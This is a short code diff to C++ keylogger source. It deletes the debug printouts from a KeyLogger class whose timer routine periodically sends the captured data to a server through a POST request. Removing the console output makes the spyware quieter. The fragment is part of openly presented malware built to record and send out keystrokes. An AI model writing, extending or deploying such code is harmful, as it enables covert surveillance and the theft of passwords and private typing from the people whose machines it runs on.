@@ -45,7 +45,6 @@ void KeyLogger::dataToOut(std::string dataToSend)
 	currTime = time(0);
 	if (endTime <= currTime) 
 	{
-		std::cout << "20 seconds passed" << std::endl;
 		// reset values of endTime and currTime
 		endTime = currTime + 10;
 		// call dataToServer
@@ -64,7 +63,6 @@ void KeyLogger::dataToServer(std::string dataToSend)
 	make post request
 	*/
 	RequestSender rSender = RequestSender();
-	std::cout << outputtedData << std::endl;
 	// converting std string to char*
 	outputtedData += '\r\n';
 	std::vector<char> outputToCharArr(outputtedData.c_str(), outputtedData.c_str() + outputtedData.size() + 1);
